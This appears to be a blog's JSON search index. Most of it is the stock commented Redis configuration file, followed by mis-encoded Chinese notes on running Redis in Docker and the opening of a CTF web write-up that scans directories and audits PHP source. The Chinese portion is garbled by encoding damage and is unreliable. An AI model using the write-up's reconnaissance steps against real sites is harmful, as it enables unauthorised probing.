0 means to never release the backlog. # # repl-backlog-ttl 3600 # The replica priority is an integer number published by Redis in the INFO output. # It is used by Redis Sentinel in order to select a replica to promote into a # master if the master is no longer working correctly. # # A replica with a low priority number is considered better for promotion, so # for instance if there are three replicas with priority 10, 100, 25 Sentinel will # pick the one with priority 10, that is the lowest. # # However a special priority of 0 marks the replica as not able to perform the # role of master, so a replica with priority of 0 will never be selected by # Redis Sentinel for promotion. # # By default the priority is 100. replica-priority 100 # It is possible for a master to stop accepting writes if there are less than # N replicas connected, having a lag less or equal than M seconds. # # The N replicas need to be in \"online\" state. # # The lag in seconds, that must be &lt;= the specified value, is calculated from # the last ping received from the replica, that is usually sent every second. # # This option does not GUARANTEE that N replicas will accept the write, but # will limit the window of exposure for lost writes in case not enough replicas # are available, to the specified number of seconds. # # For example to require at least 3 replicas with a lag &lt;= 10 seconds use: # # min-replicas-to-write 3 # min-replicas-max-lag 10 # # Setting one or the other to 0 disables the feature. # # By default min-replicas-to-write is set to 0 (feature disabled) and # min-replicas-max-lag is set to 10. # A Redis master is able to list the address and port of the attached # replicas in different ways. For example the \"INFO replication\" section # offers this information, which is used, among other tools, by # Redis Sentinel in order to discover replica instances. # Another place where this info is available is in the output of the # \"ROLE\" command of a master. # # The listed IP and address normally reported by a replica is obtained # in the following way: # # IP: The address is auto detected by checking the peer address # of the socket used by the replica to connect with the master. # # Port: The port is communicated by the replica during the replication # handshake, and is normally the port that the replica is using to # listen for connections. # # However when port forwarding or Network Address Translation (NAT) is # used, the replica may be actually reachable via different IP and port # pairs. The following two options can be used by a replica in order to # report to its master a specific set of IP and port, so that both INFO # and ROLE will report those values. # # There is no need to use both the options if you need to override just # the port or the IP address. # # replica-announce-ip 5.5.5.5 # replica-announce-port 1234 ################################## SECURITY ################################### # Require clients to issue AUTH &lt;PASSWORD&gt; before processing any other # commands. This might be useful in environments in which you do not trust # others with access to the host running redis-server. # # This should stay commented out for backward compatibility and because most # people do not need auth (e.g. they run their own servers). # # Warning: since Redis is pretty fast an outside user can try up to # 150k passwords per second against a good box. This means that you should # use a very strong password otherwise it will be very easy to break. # # requirepass foobared # Command renaming. # # It is possible to change the name of dangerous commands in a shared # environment. For instance the CONFIG command may be renamed into something # hard to guess so that it will still be available for internal-use tools # but not available for general clients. # # Example: # # rename-command CONFIG b840fc02d524045429941cc15f59e41cb7be6c52 # # It is also possible to completely kill a command by renaming it into # an empty string: # # rename-command CONFIG \"\" # # Please note that changing the name of commands that are logged into the # AOF file or transmitted to replicas may cause problems. ################################### CLIENTS #################################### # Set the max number of connected clients at the same time. By default # this limit is set to 10000 clients, however if the Redis server is not # able to configure the process file limit to allow for the specified limit # the max number of allowed clients is set to the current file limit # minus 32 (as Redis reserves a few file descriptors for internal uses). # # Once the limit is reached Redis will close all the new connections sending # an error 'max number of clients reached'. # # maxclients 10000 ############################## MEMORY MANAGEMENT ################################ # Set a memory usage limit to the specified amount of bytes. # When the memory limit is reached Redis will try to remove keys # according to the eviction policy selected (see maxmemory-policy). # # If Redis can't remove keys according to the policy, or if the policy is # set to 'noeviction', Redis will start to reply with errors to commands # that would use more memory, like SET, LPUSH, and so on, and will continue # to reply to read-only commands like GET. # # This option is usually useful when using Redis as an LRU or LFU cache, or to # set a hard memory limit for an instance (using the 'noeviction' policy). # # WARNING: If you have replicas attached to an instance with maxmemory on, # the size of the output buffers needed to feed the replicas are subtracted # from the used memory count, so that network problems / resyncs will # not trigger a loop where keys are evicted, and in turn the output # buffer of replicas is full with DELs of keys evicted triggering the deletion # of more keys, and so forth until the database is completely emptied. # # In short... if you have replicas attached it is suggested that you set a lower # limit for maxmemory so that there is some free RAM on the system for replica # output buffers (but this is not needed if the policy is 'noeviction'). # # maxmemory &lt;bytes&gt; # MAXMEMORY POLICY: how Redis will select what to remove when maxmemory # is reached. You can select among five behaviors: # # volatile-lru -&gt; Evict using approximated LRU among the keys with an expire set. # allkeys-lru -&gt; Evict any key using approximated LRU. # volatile-lfu -&gt; Evict using approximated LFU among the keys with an expire set. # allkeys-lfu -&gt; Evict any key using approximated LFU. # volatile-random -&gt; Remove a random key among the ones with an expire set. # allkeys-random -&gt; Remove a random key, any key. # volatile-ttl -&gt; Remove the key with the nearest expire time (minor TTL) # noeviction -&gt; Don't evict anything, just return an error on write operations. # # LRU means Least Recently Used # LFU means Least Frequently Used # # Both LRU, LFU and volatile-ttl are implemented using approximated # randomized algorithms. # # Note: with any of the above policies, Redis will return an error on write # operations, when there are no suitable keys for eviction. # # At the date of writing these commands are: set setnx setex append # incr decr rpush lpush rpushx lpushx linsert lset rpoplpush sadd # sinter sinterstore sunion sunionstore sdiff sdiffstore zadd zincrby # zunionstore zinterstore hset hsetnx hmset hincrby incrby decrby # getset mset msetnx exec sort # # The default is: # # maxmemory-policy noeviction # LRU, LFU and minimal TTL algorithms are not precise algorithms but approximated # algorithms (in order to save memory), so you can tune it for speed or # accuracy. For default Redis will check five keys and pick the one that was # used less recently, you can change the sample size using the following # configuration directive. # # The default of 5 produces good enough results. 10 Approximates very closely # true LRU but costs more CPU. 3 is faster but not very accurate. # # maxmemory-samples 5 # Starting from Redis 5, by default a replica will ignore its maxmemory setting # (unless it is promoted to master after a failover or manually). It means # that the eviction of keys will be just handled by the master, sending the # DEL commands to the replica as keys evict in the master side. # # This behavior ensures that masters and replicas stay consistent, and is usually # what you want, however if your replica is writable, or you want the replica to have # a different memory setting, and you are sure all the writes performed to the # replica are idempotent, then you may change this default (but be sure to understand # what you are doing). # # Note that since the replica by default does not evict, it may end using more # memory than the one set via maxmemory (there are certain buffers that may # be larger on the replica, or data structures may sometimes take more memory and so # forth). So make sure you monitor your replicas and make sure they have enough # memory to never hit a real out-of-memory condition before the master hits # the configured maxmemory setting. # # replica-ignore-maxmemory yes ############################# LAZY FREEING #################################### # Redis has two primitives to delete keys. One is called DEL and is a blocking # deletion of the object. It means that the server stops processing new commands # in order to reclaim all the memory associated with an object in a synchronous # way. If the key deleted is associated with a small object, the time needed # in order to execute the DEL command is very small and comparable to most other # O(1) or O(log_N) commands in Redis. However if the key is associated with an # aggregated value containing millions of elements, the server can block for # a long time (even seconds) in order to complete the operation. # # For the above reasons Redis also offers non blocking deletion primitives # such as UNLINK (non blocking DEL) and the ASYNC option of FLUSHALL and # FLUSHDB commands, in order to reclaim memory in background. Those commands # are executed in constant time. Another thread will incrementally free the # object in the background as fast as possible. # # DEL, UNLINK and ASYNC option of FLUSHALL and FLUSHDB are user-controlled. # It's up to the design of the application to understand when it is a good # idea to use one or the other. However the Redis server sometimes has to # delete keys or flush the whole database as a side effect of other operations. # Specifically Redis deletes objects independently of a user call in the # following scenarios: # # 1) On eviction, because of the maxmemory and maxmemory policy configurations, # in order to make room for new data, without going over the specified # memory limit. # 2) Because of expire: when a key with an associated time to live (see the # EXPIRE command) must be deleted from memory. # 3) Because of a side effect of a command that stores data on a key that may # already exist. For example the RENAME command may delete the old key # content when it is replaced with another one. Similarly SUNIONSTORE # or SORT with STORE option may delete existing keys. The SET command # itself removes any old content of the specified key in order to replace # it with the specified string. # 4) During replication, when a replica performs a full resynchronization with # its master, the content of the whole database is removed in order to # load the RDB file just transferred. # # In all the above cases the default is to delete objects in a blocking way, # like if DEL was called. However you can configure each case specifically # in order to instead release memory in a non-blocking way like if UNLINK # was called, using the following configuration directives: lazyfree-lazy-eviction no lazyfree-lazy-expire no lazyfree-lazy-server-del no replica-lazy-flush no ############################## APPEND ONLY MODE ############################### # By default Redis asynchronously dumps the dataset on disk. This mode is # good enough in many applications, but an issue with the Redis process or # a power outage may result into a few minutes of writes lost (depending on # the configured save points). # # The Append Only File is an alternative persistence mode that provides # much better durability. For instance using the default data fsync policy # (see later in the config file) Redis can lose just one second of writes in a # dramatic event like a server power outage, or a single write if something # wrong with the Redis process itself happens, but the operating system is # still running correctly. # # AOF and RDB persistence can be enabled at the same time without problems. # If the AOF is enabled on startup Redis will load the AOF, that is the file # with the better durability guarantees. # # Please check http://redis.io/topics/persistence for more information. appendonly no # The name of the append only file (default: \"appendonly.aof\") appendfilename \"appendonly.aof\" # The fsync() call tells the Operating System to actually write data on disk # instead of waiting for more data in the output buffer. Some OS will really flush # data on disk, some other OS will just try to do it ASAP. # # Redis supports three different modes: # # no: don't fsync, just let the OS flush the data when it wants. Faster. # always: fsync after every write to the append only log. Slow, Safest. # everysec: fsync only one time every second. Compromise. # # The default is \"everysec\", as that's usually the right compromise between # speed and data safety. It's up to you to understand if you can relax this to # \"no\" that will let the operating system flush the output buffer when # it wants, for better performances (but if you can live with the idea of # some data loss consider the default persistence mode that's snapshotting), # or on the contrary, use \"always\" that's very slow but a bit safer than # everysec. # # More details please check the following article: # http://antirez.com/post/redis-persistence-demystified.html # # If unsure, use \"everysec\". # appendfsync always appendfsync everysec # appendfsync no # When the AOF fsync policy is set to always or everysec, and a background # saving process (a background save or AOF log background rewriting) is # performing a lot of I/O against the disk, in some Linux configurations # Redis may block too long on the fsync() call. Note that there is no fix for # this currently, as even performing fsync in a different thread will block # our synchronous write(2) call. # # In order to mitigate this problem it's possible to use the following option # that will prevent fsync() from being called in the main process while a # BGSAVE or BGREWRITEAOF is in progress. # # This means that while another child is saving, the durability of Redis is # the same as \"appendfsync none\". In practical terms, this means that it is # possible to lose up to 30 seconds of log in the worst scenario (with the # default Linux settings). # # If you have latency problems turn this to \"yes\". Otherwise leave it as # \"no\" that is the safest pick from the point of view of durability. no-appendfsync-on-rewrite no # Automatic rewrite of the append only file. # Redis is able to automatically rewrite the log file implicitly calling # BGREWRITEAOF when the AOF log size grows by the specified percentage. # # This is how it works: Redis remembers the size of the AOF file after the # latest rewrite (if no rewrite has happened since the restart, the size of # the AOF at startup is used). # # This base size is compared to the current size. If the current size is # bigger than the specified percentage, the rewrite is triggered. Also # you need to specify a minimal size for the AOF file to be rewritten, this # is useful to avoid rewriting the AOF file even if the percentage increase # is reached but it is still pretty small. # # Specify a percentage of zero in order to disable the automatic AOF # rewrite feature. auto-aof-rewrite-percentage 100 auto-aof-rewrite-min-size 64mb # An AOF file may be found to be truncated at the end during the Redis # startup process, when the AOF data gets loaded back into memory. # This may happen when the system where Redis is running # crashes, especially when an ext4 filesystem is mounted without the # data=ordered option (however this can't happen when Redis itself # crashes or aborts but the operating system still works correctly). # # Redis can either exit with an error when this happens, or load as much # data as possible (the default now) and start if the AOF file is found # to be truncated at the end. The following option controls this behavior. # # If aof-load-truncated is set to yes, a truncated AOF file is loaded and # the Redis server starts emitting a log to inform the user of the event. # Otherwise if the option is set to no, the server aborts with an error # and refuses to start. When the option is set to no, the user requires # to fix the AOF file using the \"redis-check-aof\" utility before to restart # the server. # # Note that if the AOF file will be found to be corrupted in the middle # the server will still exit with an error. This option only applies when # Redis will try to read more data from the AOF file but not enough bytes # will be found. aof-load-truncated yes # When rewriting the AOF file, Redis is able to use an RDB preamble in the # AOF file for faster rewrites and recoveries. When this option is turned # on the rewritten AOF file is composed of two different stanzas: # # [RDB file][AOF tail] # # When loading Redis recognizes that the AOF file starts with the \"REDIS\" # string and loads the prefixed RDB file, and continues loading the AOF # tail. aof-use-rdb-preamble yes ################################ LUA SCRIPTING ############################### # Max execution time of a Lua script in milliseconds. # # If the maximum execution time is reached Redis will log that a script is # still in execution after the maximum allowed time and will start to # reply to queries with an error. # # When a long running script exceeds the maximum execution time only the # SCRIPT KILL and SHUTDOWN NOSAVE commands are available. The first can be # used to stop a script that did not yet called write commands. The second # is the only way to shut down the server in the case a write command was # already issued by the script but the user doesn't want to wait for the natural # termination of the script. # # Set it to 0 or a negative value for unlimited execution without warnings. lua-time-limit 5000 ################################ REDIS CLUSTER ############################### # Normal Redis instances can't be part of a Redis Cluster; only nodes that are # started as cluster nodes can. In order to start a Redis instance as a # cluster node enable the cluster support uncommenting the following: # # cluster-enabled yes # Every cluster node has a cluster configuration file. This file is not # intended to be edited by hand. It is created and updated by Redis nodes. # Every Redis Cluster node requires a different cluster configuration file. # Make sure that instances running in the same system do not have # overlapping cluster configuration file names. # # cluster-config-file nodes-6379.conf # Cluster node timeout is the amount of milliseconds a node must be unreachable # for it to be considered in failure state. # Most other internal time limits are multiple of the node timeout. # # cluster-node-timeout 15000 # A replica of a failing master will avoid to start a failover if its data # looks too old. # # There is no simple way for a replica to actually have an exact measure of # its \"data age\", so the following two checks are performed: # # 1) If there are multiple replicas able to failover, they exchange messages # in order to try to give an advantage to the replica with the best # replication offset (more data from the master processed). # Replicas will try to get their rank by offset, and apply to the start # of the failover a delay proportional to their rank. # # 2) Every single replica computes the time of the last interaction with # its master. This can be the last ping or command received (if the master # is still in the \"connected\" state), or the time that elapsed since the # disconnection with the master (if the replication link is currently down). # If the last interaction is too old, the replica will not try to failover # at all. # # The point \"2\" can be tuned by user. Specifically a replica will not perform # the failover if, since the last interaction with the master, the time # elapsed is greater than: # # (node-timeout * replica-validity-factor) + repl-ping-replica-period # # So for example if node-timeout is 30 seconds, and the replica-validity-factor # is 10, and assuming a default repl-ping-replica-period of 10 seconds, the # replica will not try to failover if it was not able to talk with the master # for longer than 310 seconds. # # A large replica-validity-factor may allow replicas with too old data to failover # a master, while a too small value may prevent the cluster from being able to # elect a replica at all. # # For maximum availability, it is possible to set the replica-validity-factor # to a value of 0, which means, that replicas will always try to failover the # master regardless of the last time they interacted with the master. # (However they'll always try to apply a delay proportional to their # offset rank). # # Zero is the only value able to guarantee that when all the partitions heal # the cluster will always be able to continue. # # cluster-replica-validity-factor 10 # Cluster replicas are able to migrate to orphaned masters, that are masters # that are left without working replicas. This improves the cluster ability # to resist to failures as otherwise an orphaned master can't be failed over # in case of failure if it has no working replicas. # # Replicas migrate to orphaned masters only if there are still at least a # given number of other working replicas for their old master. This number # is the \"migration barrier\". A migration barrier of 1 means that a replica # will migrate only if there is at least 1 other working replica for its master # and so forth. It usually reflects the number of replicas you want for every # master in your cluster. # # Default is 1 (replicas migrate only if their masters remain with at least # one replica). To disable migration just set it to a very large value. # A value of 0 can be set but is useful only for debugging and dangerous # in production. # # cluster-migration-barrier 1 # By default Redis Cluster nodes stop accepting queries if they detect there # is at least an hash slot uncovered (no available node is serving it). # This way if the cluster is partially down (for example a range of hash slots # are no longer covered) all the cluster becomes, eventually, unavailable. # It automatically returns available as soon as all the slots are covered again. # # However sometimes you want the subset of the cluster which is working, # to continue to accept queries for the part of the key space that is still # covered. In order to do so, just set the cluster-require-full-coverage # option to no. # # cluster-require-full-coverage yes # This option, when set to yes, prevents replicas from trying to failover its # master during master failures. However the master can still perform a # manual failover, if forced to do so. # # This is useful in different scenarios, especially in the case of multiple # data center operations, where we want one side to never be promoted if not # in the case of a total DC failure. # # cluster-replica-no-failover no # In order to setup your cluster make sure to read the documentation # available at http://redis.io web site. ########################## CLUSTER DOCKER/NAT support ######################## # In certain deployments, Redis Cluster nodes address discovery fails, because # addresses are NAT-ted or because ports are forwarded (the typical case is # Docker and other containers). # # In order to make Redis Cluster working in such environments, a static # configuration where each node knows its public address is needed. The # following two options are used for this scope, and are: # # * cluster-announce-ip # * cluster-announce-port # * cluster-announce-bus-port # # Each instruct the node about its address, client port, and cluster message # bus port. The information is then published in the header of the bus packets # so that other nodes will be able to correctly map the address of the node # publishing the information. # # If the above options are not used, the normal Redis Cluster auto-detection # will be used instead. # # Note that when remapped, the bus port may not be at the fixed offset of # clients port + 10000, so you can specify any port and bus-port depending # on how they get remapped. If the bus-port is not set, a fixed offset of # 10000 will be used as usually. # # Example: # # cluster-announce-ip 10.1.1.5 # cluster-announce-port 6379 # cluster-announce-bus-port 6380 ################################## SLOW LOG ################################### # The Redis Slow Log is a system to log queries that exceeded a specified # execution time. The execution time does not include the I/O operations # like talking with the client, sending the reply and so forth, # but just the time needed to actually execute the command (this is the only # stage of command execution where the thread is blocked and can not serve # other requests in the meantime). # # You can configure the slow log with two parameters: one tells Redis # what is the execution time, in microseconds, to exceed in order for the # command to get logged, and the other parameter is the length of the # slow log. When a new command is logged the oldest one is removed from the # queue of logged commands. # The following time is expressed in microseconds, so 1000000 is equivalent # to one second. Note that a negative number disables the slow log, while # a value of zero forces the logging of every command. slowlog-log-slower-than 10000 # There is no limit to this length. Just be aware that it will consume memory. # You can reclaim memory used by the slow log with SLOWLOG RESET. slowlog-max-len 128 ################################ LATENCY MONITOR ############################## # The Redis latency monitoring subsystem samples different operations # at runtime in order to collect data related to possible sources of # latency of a Redis instance. # # Via the LATENCY command this information is available to the user that can # print graphs and obtain reports. # # The system only logs operations that were performed in a time equal or # greater than the amount of milliseconds specified via the # latency-monitor-threshold configuration directive. When its value is set # to zero, the latency monitor is turned off. # # By default latency monitoring is disabled since it is mostly not needed # if you don't have latency issues, and collecting data has a performance # impact, that while very small, can be measured under big load. Latency # monitoring can easily be enabled at runtime using the command # \"CONFIG SET latency-monitor-threshold &lt;milliseconds&gt;\" if needed. latency-monitor-threshold 0 ############################# EVENT NOTIFICATION ############################## # Redis can notify Pub/Sub clients about events happening in the key space. # This feature is documented at http://redis.io/topics/notifications # # For instance if keyspace events notification is enabled, and a client # performs a DEL operation on key \"foo\" stored in the Database 0, two # messages will be published via Pub/Sub: # # PUBLISH __keyspace@0__:foo del # PUBLISH __keyevent@0__:del foo # # It is possible to select the events that Redis will notify among a set # of classes. Every class is identified by a single character: # # K Keyspace events, published with __keyspace@&lt;db&gt;__ prefix. # E Keyevent events, published with __keyevent@&lt;db&gt;__ prefix. # g Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ... # $ String commands # l List commands # s Set commands # h Hash commands # z Sorted set commands # x Expired events (events generated every time a key expires) # e Evicted events (events generated when a key is evicted for maxmemory) # A Alias for g$lshzxe, so that the \"AKE\" string means all the events. # # The \"notify-keyspace-events\" takes as argument a string that is composed # of zero or multiple characters. The empty string means that notifications # are disabled. # # Example: to enable list and generic events, from the point of view of the # event name, use: # # notify-keyspace-events Elg # # Example 2: to get the stream of the expired keys subscribing to channel # name __keyevent@0__:expired use: # notify-keyspace-events Ex # # By default all notifications are disabled because most users don't need # this feature and the feature has some overhead. Note that if you don't # specify at least one of K or E, no events will be delivered. #notify-keyspace-events \"\" ############################### ADVANCED CONFIG ############################### # Hashes are encoded using a memory efficient data structure when they have a # small number of entries, and the biggest entry does not exceed a given # threshold. These thresholds can be configured using the following directives. hash-max-ziplist-entries 512 hash-max-ziplist-value 64 # Lists are also encoded in a special way to save a lot of space. # The number of entries allowed per internal list node can be specified # as a fixed maximum size or a maximum number of elements. # For a fixed maximum size, use -5 through -1, meaning: # -5: max size: 64 Kb &lt;-- not recommended for normal workloads # -4: max size: 32 Kb &lt;-- not recommended # -3: max size: 16 Kb &lt;-- probably not recommended # -2: max size: 8 Kb &lt;-- good # -1: max size: 4 Kb &lt;-- good # Positive numbers mean store up to _exactly_ that number of elements # per list node. # The highest performing option is usually -2 (8 Kb size) or -1 (4 Kb size), # but if your use case is unique, adjust the settings as necessary. list-max-ziplist-size -2 # Lists may also be compressed. # Compress depth is the number of quicklist ziplist nodes from *each* side of # the list to *exclude* from compression. The head and tail of the list # are always uncompressed for fast push/pop operations. Settings are: # 0: disable all list compression # 1: depth 1 means \"don't start compressing until after 1 node into the list, # going from either the head or tail\" # So: [head]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[tail] # [head], [tail] will always be uncompressed; inner nodes will compress. # 2: [head]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[tail] # 2 here means: don't compress head or head-&gt;next or tail-&gt;prev or tail, # but compress all nodes between them. # 3: [head]-&gt;[next]-&gt;[next]-&gt;node-&gt;node-&gt;...-&gt;node-&gt;[prev]-&gt;[prev]-&gt;[tail] # etc. list-compress-depth 0 # Sets have a special encoding in just one case: when a set is composed # of just strings that happen to be integers in radix 10 in the range # of 64 bit signed integers. # The following configuration setting sets the limit in the size of the # set in order to use this special memory saving encoding. set-max-intset-entries 512 # Similarly to hashes and lists, sorted sets are also specially encoded in # order to save a lot of space. This encoding is only used when the length and # elements of a sorted set are below the following limits: zset-max-ziplist-entries 128 zset-max-ziplist-value 64 # HyperLogLog sparse representation bytes limit. The limit includes the # 16 bytes header. When an HyperLogLog using the sparse representation crosses # this limit, it is converted into the dense representation. # # A value greater than 16000 is totally useless, since at that point the # dense representation is more memory efficient. # # The suggested value is ~ 3000 in order to have the benefits of # the space efficient encoding without slowing down too much PFADD, # which is O(N) with the sparse encoding. The value can be raised to # ~ 10000 when CPU is not a concern, but space is, and the data set is # composed of many HyperLogLogs with cardinality in the 0 - 15000 range. hll-sparse-max-bytes 3000 # Streams macro node max size / items. The stream data structure is a radix # tree of big nodes that encode multiple items inside. Using this configuration # it is possible to configure how big a single node can be in bytes, and the # maximum number of items it may contain before switching to a new node when # appending new stream entries. If any of the following settings are set to # zero, the limit is ignored, so for instance it is possible to set just a # max entires limit by setting max-bytes to 0 and max-entries to the desired # value. stream-node-max-bytes 4096 stream-node-max-entries 100 # Active rehashing uses 1 millisecond every 100 milliseconds of CPU time in # order to help rehashing the main Redis hash table (the one mapping top-level # keys to values). The hash table implementation Redis uses (see dict.c) # performs a lazy rehashing: the more operation you run into a hash table # that is rehashing, the more rehashing \"steps\" are performed, so if the # server is idle the rehashing is never complete and some more memory is used # by the hash table. # # The default is to use this millisecond 10 times every second in order to # actively rehash the main dictionaries, freeing memory when possible. # # If unsure: # use \"activerehashing no\" if you have hard latency requirements and it is # not a good thing in your environment that Redis can reply from time to time # to queries with 2 milliseconds delay. # # use \"activerehashing yes\" if you don't have such hard requirements but # want to free memory asap when possible. activerehashing yes # The client output buffer limits can be used to force disconnection of clients # that are not reading data from the server fast enough for some reason (a # common reason is that a Pub/Sub client can't consume messages as fast as the # publisher can produce them). # # The limit can be set differently for the three different classes of clients: # # normal -&gt; normal clients including MONITOR clients # replica -&gt; replica clients # pubsub -&gt; clients subscribed to at least one pubsub channel or pattern # # The syntax of every client-output-buffer-limit directive is the following: # # client-output-buffer-limit &lt;class&gt; &lt;hard limit&gt; &lt;soft limit&gt; &lt;soft seconds&gt; # # A client is immediately disconnected once the hard limit is reached, or if # the soft limit is reached and remains reached for the specified number of # seconds (continuously). # So for instance if the hard limit is 32 megabytes and the soft limit is # 16 megabytes / 10 seconds, the client will get disconnected immediately # if the size of the output buffers reach 32 megabytes, but will also get # disconnected if the client reaches 16 megabytes and continuously overcomes # the limit for 10 seconds. # # By default normal clients are not limited because they don't receive data # without asking (in a push way), but just after a request, so only # asynchronous clients may create a scenario where data is requested faster # than it can read. # # Instead there is a default limit for pubsub and replica clients, since # subscribers and replicas receive data in a push fashion. # # Both the hard or the soft limit can be disabled by setting them to zero. client-output-buffer-limit normal 0 0 0 client-output-buffer-limit replica 256mb 64mb 60 client-output-buffer-limit pubsub 32mb 8mb 60 # Client query buffers accumulate new commands. They are limited to a fixed # amount by default in order to avoid that a protocol desynchronization (for # instance due to a bug in the client) will lead to unbound memory usage in # the query buffer. However you can configure it here if you have very special # needs, such us huge multi/exec requests or alike. # # client-query-buffer-limit 1gb # In the Redis protocol, bulk requests, that are, elements representing single # strings, are normally limited ot 512 mb. However you can change this limit # here. # # proto-max-bulk-len 512mb # Redis calls an internal function to perform many background tasks, like # closing connections of clients in timeout, purging expired keys that are # never requested, and so forth. # # Not all tasks are performed with the same frequency, but Redis checks for # tasks to perform according to the specified \"hz\" value. # # By default \"hz\" is set to 10. Raising the value will use more CPU when # Redis is idle, but at the same time will make Redis more responsive when # there are many keys expiring at the same time, and timeouts may be # handled with more precision. # # The range is between 1 and 500, however a value over 100 is usually not # a good idea. Most users should use the default of 10 and raise this up to # 100 only in environments where very low latency is required. hz 10 # Normally it is useful to have an HZ value which is proportional to the # number of clients connected. This is useful in order, for instance, to # avoid too many clients are processed for each background task invocation # in order to avoid latency spikes. # # Since the default HZ value by default is conservatively set to 10, Redis # offers, and enables by default, the ability to use an adaptive HZ value # which will temporary raise when there are many connected clients. # # When dynamic HZ is enabled, the actual configured HZ will be used as # as a baseline, but multiples of the configured HZ value will be actually # used as needed once more clients are connected. In this way an idle # instance will use very little CPU time while a busy instance will be # more responsive. dynamic-hz yes # When a child rewrites the AOF file, if the following option is enabled # the file will be fsync-ed every 32 MB of data generated. This is useful # in order to commit the file to the disk more incrementally and avoid # big latency spikes. aof-rewrite-incremental-fsync yes # When redis saves RDB file, if the following option is enabled # the file will be fsync-ed every 32 MB of data generated. This is useful # in order to commit the file to the disk more incrementally and avoid # big latency spikes. rdb-save-incremental-fsync yes # Redis LFU eviction (see maxmemory setting) can be tuned. However it is a good # idea to start with the default settings and only change them after investigating # how to improve the performances and how the keys LFU change over time, which # is possible to inspect via the OBJECT FREQ command. # # There are two tunable parameters in the Redis LFU implementation: the # counter logarithm factor and the counter decay time. It is important to # understand what the two parameters mean before changing them. # # The LFU counter is just 8 bits per key, it's maximum value is 255, so Redis # uses a probabilistic increment with logarithmic behavior. Given the value # of the old counter, when a key is accessed, the counter is incremented in # this way: # # 1. A random number R between 0 and 1 is extracted. # 2. A probability P is calculated as 1/(old_value*lfu_log_factor+1). # 3. The counter is incremented only if R &lt; P. # # The default lfu-log-factor is 10. This is a table of how the frequency # counter changes with a different number of accesses with different # logarithmic factors: # # +--------+------------+------------+------------+------------+------------+ # | factor | 100 hits | 1000 hits | 100K hits | 1M hits | 10M hits | # +--------+------------+------------+------------+------------+------------+ # | 0 | 104 | 255 | 255 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 1 | 18 | 49 | 255 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 10 | 10 | 18 | 142 | 255 | 255 | # +--------+------------+------------+------------+------------+------------+ # | 100 | 8 | 11 | 49 | 143 | 255 | # +--------+------------+------------+------------+------------+------------+ # # NOTE: The above table was obtained by running the following commands: # # redis-benchmark -n 1000000 incr foo # redis-cli object freq foo # # NOTE 2: The counter initial value is 5 in order to give new objects a chance # to accumulate hits. # # The counter decay time is the time, in minutes, that must elapse in order # for the key counter to be divided by two (or decremented if it has a value # less &lt;= 10). # # The default value for the lfu-decay-time is 1. A Special value of 0 means to # decay the counter every time it happens to be scanned. # # lfu-log-factor 10 # lfu-decay-time 1 ########################### ACTIVE DEFRAGMENTATION ####################### # # WARNING THIS FEATURE IS EXPERIMENTAL. However it was stress tested # even in production and manually tested by multiple engineers for some # time. # # What is active defragmentation? # ------------------------------- # # Active (online) defragmentation allows a Redis server to compact the # spaces left between small allocations and deallocations of data in memory, # thus allowing to reclaim back memory. # # Fragmentation is a natural process that happens with every allocator (but # less so with Jemalloc, fortunately) and certain workloads. Normally a server # restart is needed in order to lower the fragmentation, or at least to flush # away all the data and create it again. However thanks to this feature # implemented by Oran Agra for Redis 4.0 this process can happen at runtime # in an \"hot\" way, while the server is running. # # Basically when the fragmentation is over a certain level (see the # configuration options below) Redis will start to create new copies of the # values in contiguous memory regions by exploiting certain specific Jemalloc # features (in order to understand if an allocation is causing fragmentation # and to allocate it in a better place), and at the same time, will release the # old copies of the data. This process, repeated incrementally for all the keys # will cause the fragmentation to drop back to normal values. # # Important things to understand: # # 1. This feature is disabled by default, and only works if you compiled Redis # to use the copy of Jemalloc we ship with the source code of Redis. # This is the default with Linux builds. # # 2. You never need to enable this feature if you don't have fragmentation # issues. # # 3. Once you experience fragmentation, you can enable this feature when # needed with the command \"CONFIG SET activedefrag yes\". # # The configuration parameters are able to fine tune the behavior of the # defragmentation process. If you are not sure about what they mean it is # a good idea to leave the defaults untouched. # Enabled active defragmentation # activedefrag yes # Minimum amount of fragmentation waste to start active defrag # active-defrag-ignore-bytes 100mb # Minimum percentage of fragmentation to start active defrag # active-defrag-threshold-lower 10 # Maximum percentage of fragmentation at which we use maximum effort # active-defrag-threshold-upper 100 # Minimal effort for defrag in CPU percentage # active-defrag-cycle-min 5 # Maximal effort for defrag in CPU percentage # active-defrag-cycle-max 75 # Maximum number of set/hash/zset/list fields that will be processed from # the main dictionary scan # active-defrag-max-scan-fields 1000 ä½¿ç”¨redis6.0.8é•œåƒåˆ›å»ºå®¹å™¨(ä¹Ÿå«è¿è¡Œé•œåƒ) docker run -p 6379:6379 --name myr3 --privileged=true -v /app/redis/redis.conf:/etc/redis/redis.conf -v /app/redis/data:/data -d redis:6.0.8 redis-server /etc/redis/redis.conf æµ‹è¯•redis-cliè¿æ¥ä¸Šæ¥ docker exec -it è¿è¡Œç€RediisæœåŠ¡çš„å®¹å™¨ID redis-cli è¯·è¯æ˜dockerå¯åŠ¨ä½¿ç”¨äº†æˆ‘ä»¬è‡ªå·±æŒ‡å®šçš„é…ç½®æ–‡ä»¶ ä¿®æ”¹å‰ æˆ‘ä»¬ç”¨çš„é…ç½®æ–‡ä»¶ï¼Œæ•°æ®åº“é»˜è®¤æ˜¯16ä¸ª ä¿®æ”¹å å®¿ä¸»æœºçš„ä¿®æ”¹ä¼šåŒæ­¥ç»™dockerå®¹å™¨é‡Œé¢çš„é…ç½®ã€‚è®°å¾—é‡å¯æœåŠ¡ æµ‹è¯•redis-cliè¿æ¥ä¸Šæ¥ç¬¬2æ¬¡ 8.5 å®‰è£…Nginx è§é«˜çº§ç¯‡Portainer","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["Docker"]},{"title":"å†…éƒ¨ç«èµ›1","path":"/2023/08/06/nei-bu-jing-sai-ti-1/","content":"0x01 web1 æ‰“å¼€é¢˜ç›®ï¼Œæ²¡ä»€ä¹ˆå‘ç°ï¼Œéšåç”¨dirsearchæ‰«ç›®å½•ï¼Œå¯ä»¥å‘ç°å­˜åœ¨robots.txtï¼Œè®¿é—®è¯¥æ–‡ä»¶å‘ç°å¦‚ä¸‹PHPæ–‡ä»¶ è®¿é—®è¯¥æ–‡ä»¶å‘ç°æºç  å®¡è®¡å‘ç°åˆ©ç”¨PHPç‰¹æ€§ 